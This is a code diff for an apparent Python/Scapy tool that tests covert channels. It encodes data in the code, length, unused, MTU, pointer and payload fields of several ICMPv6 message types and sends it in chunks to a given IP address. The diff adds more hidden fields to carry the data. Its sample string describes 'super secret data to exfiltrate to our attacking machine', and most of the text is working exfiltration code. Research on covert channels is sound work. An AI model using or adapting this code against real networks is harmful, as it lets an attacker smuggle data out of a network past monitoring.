@@ -13,7 +13,7 @@ from bitstring import *
 """
 This class is for testing all covert channels in one
 """
-class AllTests:
+class AllCovertTests:
 
     def __init__(self, iface):
         self.dataToExfilt = ': this is the super secret data to exfiltrate to our attacking machine\n'        
@@ -41,12 +41,18 @@ class AllTests:
             #execution of all tests
             elif re.match('exec', command):
                 dest = DestinationUnreachableCovert()
-                dest.execModule(self.dataToExfilt, self.iface, self.ipAddress)
+                dest.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
+                dest.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
+                dest.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
+                dest.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                 big = PacketTooBigCovert()
                 big.execModule(self.dataToExfilt, '', self.iface, self.ipAddress)
                 big.execModule('', self.dataToExfilt, self.iface, self.ipAddress)
                 time = TimeExceededCovert()
-                time.execModule(self.dataToExfilt, self.iface, self.ipAddress)
+                time.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
+                time.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
+                time.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
+                time.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                 param = ParameterProblemCovert()
                 param.execModule(self.dataToExfilt, '', self.iface, self.ipAddress)
                 param.execModule('', self.dataToExfilt, self.iface, self.ipAddress)
@@ -96,24 +102,56 @@ class AllTests:
     def showHelp(self):
         for entry in Help.getAllCovertTestHelp():
             print entry
-                
-class DestinationUnreachableCovert:
 
+class DestinationUnreachableCovert:
+    
     def __init__(self):
         self.bandwidthCode = 1
+        self.bandwidthLength = 1
+        self.bandwidthUnused = 3
+        self.bandwidthPayload = 8
         self.nameCode = 'Destination Unreachable code '
-         
-    def buildPacketCode(self, chunk, ipAdr):
-        self.packet = IPv6(dst=ipAdr)/ICMPv6DestUnreach(code=chunk)
+        self.nameLength = 'Destination Unreachable length '
+        self.nameUnused = 'Destination Unreachable unused '
+        self.namePayload = 'Destination Unreachable payload '
         
-    def execModule(self, dataCode, exitIface, ipAdr):
+    def buildPacketCode(self, chunk, ipAdr):
+        self.packet = IPv6(dst=ipAdr)/ICMPv6DestUnreach(code=chunk)/"x"
+
+    def buildPacketLength(self, chunk, ipAdr):
+        self.packet = IPv6(dst=ipAdr)/ICMPv6DestUnreach(length=chunk)/"x"
+
+    def buildPacketUnused(self, chunk, ipAdr):
+        self.packet = IPv6(dst=ipAdr)/ICMPv6DestUnreach(unused=chunk)/"x"
+
+    def buildPacketPayload(self, chunk, ipAdr):
+        self.packet = IPv6(dst=ipAdr)/ICMPv6DestUnreach()/str(chunk)
+        
+    def execModule(self, dataCode, dataLength, dataUnused, dataPayload, exitIface, ipAdr):
         if dataCode:
             data = self.nameCode+dataCode
             sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
             for chunk in sendingBuffer:
                 self.buildPacketCode(chunk, ipAdr)
                 send(self.packet, iface=exitIface, verbose=False)
-            sendingBuffer = []
+        if dataLength:
+            data = self.nameLength+dataLength
+            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthLength, self.nameLength)
+            for chunk in sendingBuffer:
+                self.buildPacketLength(chunk, ipAdr)
+                send(self.packet, iface=exitIface, verbose=False)
+        if dataUnused:
+            data = self.nameUnused+dataUnused
+            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthUnused, self.nameUnused)
+            for chunk in sendingBuffer:
+                self.buildPacketUnused(chunk, ipAdr)
+                send(self.packet, iface=exitIface, verbose=False)
+        if dataPayload:
+            data = self.namePayload+dataPayload
+            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthPayload, self.namePayload)
+            for chunk in sendingBuffer:
+                self.buildPacketPayload(chunk, ipAdr)
+                send(self.packet, iface=exitIface, verbose=False)
 
         
 class PacketTooBigCovert:
@@ -123,12 +161,12 @@ class PacketTooBigCovert:
         self.bandwidthMtu = 4
         self.nameCode = 'Packet Too Big code '
         self.nameMtu = 'Packet Too Big MTU '
-
+        
     def buildPacketCode(self, chunk, ipAdr):
-        self.packet = IPv6(dst=ipAdr)/ICMPv6PacketTooBig(code=chunk)
+        self.packet = IPv6(dst=ipAdr)/ICMPv6PacketTooBig(code=chunk)/"x"
 
     def buildPacketMtu(self, chunk, ipAdr):
-        self.packet = IPv6(dst=ipAdr)/ICMPv6PacketTooBig(mtu=chunk)
+        self.packet = IPv6(dst=ipAdr)/ICMPv6PacketTooBig(mtu=chunk)/"x"
         
     def execModule(self, dataCode, dataMtu, exitIface, ipAdr):
         if dataCode:
@@ -147,19 +185,53 @@ class PacketTooBigCovert:
 class TimeExceededCovert:
 
     def __init__(self):
-        self.bandwidth = 1
-        self.name = 'Time Exceeded code '
+        self.bandwidthCode = 1
+        self.bandwidthLength = 1
+        self.bandwidthUnused = 3
+        self.bandwidthPayload = 8
+        self.nameCode = 'Time Exceeded code '
+        self.nameLength = 'Time Exceeded length '
+        self.nameUnused = 'Time Exceeded unused '
+        self.namePayload = 'Time Exceeded payload '
 
-    def buildPacket(self, chunk, ipAdr):
-        self.packet = IPv6(dst=ipAdr)/ICMPv6TimeExceeded(code=chunk)
+    def buildPacketCode(self, chunk, ipAdr):
+        self.packet = IPv6(dst=ipAdr)/ICMPv6TimeExceeded(code=chunk)/"x"
+
+    def buildPacketLength(self, chunk, ipAdr):
+        self.packet = IPv6(dst=ipAdr)/ICMPv6TimeExceeded(length=chunk)/"x"
+
+    def buildPacketUnused(self, chunk, ipAdr):
+        self.packet = IPv6(dst=ipAdr)/ICMPv6TimeExceeded(unused=chunk)/"x"
+
+    def buildPacketPayload(self, chunk, ipAdr):
+        self.packet = IPv6(dst=ipAdr)/ICMPv6TimeExceeded()/str(chunk)
         
-    def execModule(self, data, exitIface, ipAdr):
-        data = self.name+data
-        sendingBuffer = HelperClass.chunkPackets(data, self.bandwidth, self.name)
-        for chunk in sendingBuffer:
-            self.buildPacket(chunk, ipAdr)
-            send(self.packet, iface=exitIface, verbose=False)
-        
+    def execModule(self, dataCode, dataLength, dataUnused, dataPayload, exitIface, ipAdr):
+        if dataCode:
+            data = self.nameCode+dataCode
+            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
+            for chunk in sendingBuffer:
+                self.buildPacketCode(chunk, ipAdr)
+                send(self.packet, iface=exitIface, verbose=False)
+        if dataLength:
+            data = self.nameLength+dataLength
+            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthLength, self.nameLength)
+            for chunk in sendingBuffer:
+                self.buildPacketLength(chunk, ipAdr)
+                send(self.packet, iface=exitIface, verbose=False)
+        if dataUnused:
+            data = self.nameUnused+dataUnused
+            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthUnused, self.nameUnused)
+            for chunk in sendingBuffer:
+                self.buildPacketUnused(chunk, ipAdr)
+                send(self.packet, iface=exitIface, verbose=False)
+        if dataPayload:
+            data = self.namePayload+dataPayload
+            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthPayload, self.namePayload)
+            for chunk in sendingBuffer:
+                self.buildPacketPayload(chunk, ipAdr)
+                send(self.packet, iface=exitIface, verbose=False)
+            
 class ParameterProblemCovert:
 
     def __init__(self):
@@ -169,10 +241,10 @@ class ParameterProblemCovert:
         self.namePointer = 'Parameter Problem pointer '
         
     def buildPacketCode(self, chunk, ipAdr):
-        self.packet = IPv6(dst=ipAdr)/ICMPv6ParamProblem(code=chunk)
+        self.packet = IPv6(dst=ipAdr)/ICMPv6ParamProblem(code=chunk)/"x"
 
     def buildPacketPointer(self, chunk, ipAdr):
-        self.packet = IPv6(dst=ipAdr)/ICMPv6ParamProblem(ptr=chunk)
+        self.packet = IPv6(dst=ipAdr)/ICMPv6ParamProblem(ptr=chunk)/"x"
 
     def execModule(self, dataCode, dataPointer, exitIface, ipAdr):
         if dataCode:
